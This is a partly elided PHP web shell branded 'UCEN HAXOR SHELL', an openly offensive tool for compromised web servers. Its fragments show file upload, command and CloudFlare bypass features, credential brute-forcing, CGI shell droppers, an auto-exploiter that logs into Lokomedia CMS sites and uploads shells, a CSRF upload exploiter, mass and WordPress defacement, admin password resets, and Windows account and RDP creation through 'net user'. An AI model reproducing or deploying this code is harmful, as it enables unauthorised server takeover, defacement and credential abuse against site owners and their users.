<?php
#####################################
#   UCEN HAXOR ♡ FITRII CANTIK                     #
#	Coded By UCEN HAXOR ♡ FITRII CANTIK			#
# 	ucengantengers@protonmail.com 		# 
# 	4ever only email :)				#
#   Security? that just an illucions#                 
# 	KOBUSTER GHOST TEAM }{ Karawang Xploit          		#                 
#####################################
...
<html>
<head>
	<link rel="SHORTCUT ICON" href="https://raw.githubusercontent.com/CikampekGetarCyber/CikampekGetarCyber/main/20220508_160022.png">
<title>xXx::.UCEN HAXOR SHELL.::xXx/title>
<style type="text/css">
html {
	background: #000000;
	color: green;
...
<center><div id="contenttengah"><center>
		<img title="UCEN HAXOR"src="https://raw.githubusercontent.com/CikampekGetarCyber/CikampekGetarCyber/main/20220508_160022.png" width="70%"></div> </center>


<span class="style4"> Shell Programmer: <br>UCENHAXOR</span><br><br>
<span class="style4">UCENHAXOR: <br>SQL47.ID</span><br><br>
...
<font color = "red" face = "Iceland" size = "6">UCENHAXOR Bypass</font><br><br><br>
...
<font color="#FFF000"> Users Found : <font color = 'red'>root@UCENHAXOR:~$ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font></font><br>
<font color="lime"> Connecting To Our Master ^_^  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="#F00000"><font color="#FFF000">root@UCENHAXOR:~$</font> Connected ! </font><br>
...
<font color="red">root@UCENHAXOR:~$ </font><font color="#FFF000"><?php echo "@". $ServerName ?><br></font><font color="red">Ready To Fuck Server :p</font>
</tr>
</tbody></table>
<br>
...
<head>
	<link rel="SHORTCUT ICON" href="https://raw.githubusercontent.com/CikampekGetarCyber/CikampekGetarCyber/main/20220508_160022.png">
<title>xXx::. UCEN HAXOR SHELL .::xXxx</title>
...
echo "<center>";
echo "<br>";
echo "<img src = 'https://raw.githubusercontent.com/CikampekGetarCyber/CikampekGetarCyber/main/20220508_160022.png' width = '110' height = '110' id='spinner'></img>";
echo "&emsp;&emsp;&emsp;";
echo "<font size='20px' color='red' face = 'Rajdhani'>$ UCEN HAXOR SHELL $</font>";
echo "&emsp;";
echo "<img src = 'https://raw.githubusercontent.com/CikampekGetarCyber/CikampekGetarCyber/main/20220508_160022.png' width = '100' height = '100' id='spinner'></img>";
echo "<br><br>";
if($_POST['upload']) {
...
//Fungsi log dinonaktifkan oleh UCEN HAXOR
/*
$ch = curl_init();
...
<center/><br/><b><font color=white>-=[ Command  Bypass Exploit  By UCEN HAXOR ]=-</font></b><br>
<?php
print_r('
<pre>
...
<center><p align="center" dir="ltr"><b><font size="5" face="Tahoma">+--=[ Bypass CloudFlare By UCEN HAXOR ]=--+
</font></b></p>
...
echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>This Password Seems Working !Try It ^_^ by UCEN HAXOR|| Username: <font color='green'>$user</font>&nbsp; Password : <font color='green'>$pass</font></font></p>";
}
}            
...
<br>
<br>
<center><p><b><font size='2' face='Trebuchet MS' color='#FFFFFF'>Published by : UCENHAXOR<br><font size='2' face='Trebuchet MS' color='#FFFFFF'>Coded by : UCEN HAXOR</font></b></p></center>";
}
...
echo"</textarea><br>ID: <input type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By UCEN HAXOR Ft FITRI CANTIK'><br>POST CONTENT: <input type='text' name='content' value='Hacked By UCEN HAXOR Ft FITRI CANTIK'><br>POSTNAME: <input type='text' name='postname' value='HackeD By UCEN HAXOR Ft FITRI CANTIK'><br>
...
elseif($_GET['do'] == 'cgi') {
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi.UCEN HAXOR' target='_blank'>Klik Here</a>";
...
elseif($_GET['do'] == 'cgi2') {
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi2.UCEN HAXOR'target='_blank'>Klik Here</a>";
} 
	...
	foreach($domain as $url) {
		foreach($up as $user => $pass) {
			...
			if(preg_match("/Logout|Administrator/", $login)) {
				...
				$data2 = array(
					"judul" => "UCEN HAXOR Shell auto exploiter lokomedia",
					"fupload" => "@$file",
					"upload" => " &nbsp;&nbsp;&nbsp;&nbsp; Simpan &nbsp;&nbsp;&nbsp;&nbsp;",
					);
...
if($_POST['username'] and $_POST['password']){
        ...
        echo "<p align='center' dir='ltr'><font size='2'>Coded By : UCENHAXOR, &amp; Recoded by UCEN HAXOR</font></p>";

} elseif($_GET['do'] == 'csrfup')
{	
echo '<html>
<center><h1 style="font-size:33px;">CSRF Exploiter By IndoXPloit<br>Recoded by UCEN HAXOR</h1><br><br>
...
<INPUT class=inputzbut type=submit value=setting name=send>
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By UCENHAXOR FT QUEEN FITRII</textarea><br>
...
<?php
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='UCEN HAXOR' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='UCEN HAXOR' placeholder='pass_baru'><br>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by UCENHAXOR FT QUEEN FITRII' placeholder='New Title'><br><br>
	...
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='UCENHAXOR'><br>
		<u>Domains</u>: <br>
...
echo "</center></table>";   
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by UCEN HAXOR' required><br>
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				$cek = exe("net user $user UCEN HAXOR");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>UCEN HAXOR</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
			...
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='UCEN HAXOR' required>
			<input type='text' name='pass' placeholder='password' value='UCEN HAXOR' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
